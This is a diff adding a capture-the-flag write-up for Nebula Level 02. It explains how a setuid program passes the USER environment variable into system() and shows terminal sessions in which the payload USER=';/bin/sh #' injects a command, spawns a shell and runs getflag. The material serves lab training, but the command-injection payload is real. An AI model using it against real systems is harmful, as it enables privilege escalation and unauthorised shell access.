@@ -79,8 +79,35 @@ You have successfully executed getflag on a target account
 ```
 ### Level 02
 
+[Level 02 Description](https://exploit.education/nebula/level-02/)
 
+From inspection of the source code attached to the description we can see that the `flag02` program uses fills a buffer with a command which is then executed by the `system()` function. The command uses `echo` to print the USER environment variable. We can modify the USER variable to manipulate the command to give use a shell.
 
+Initial experimentation:
+```
+level02@nebula:~$ cd /home/flag02
+level02@nebula:/home/flag02$ ./flag02 
+about to call system("/bin/echo level02 is cool")
+level02 is cool
+```
+Initial attempt at changing the USER variable:
+```
+level02@nebula:/home/flag02$ USER=/bin/sh ./flag02
+about to call system("/bin/echo /bin/sh is cool")
+/bin/sh is cool
+level02@nebula:/home/flag02$ USER=/bin/sh; ./flag02
+about to call system("/bin/echo /bin/sh is cool")
+/bin/sh is cool
+```
+Success!
+```
+level02@nebula:/home/flag02$ USER=';/bin/sh #' ./flag02
+about to call system("/bin/echo ;/bin/sh # is cool")
+
+sh-4.2$ #
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+```
 ### Level 03
 
 
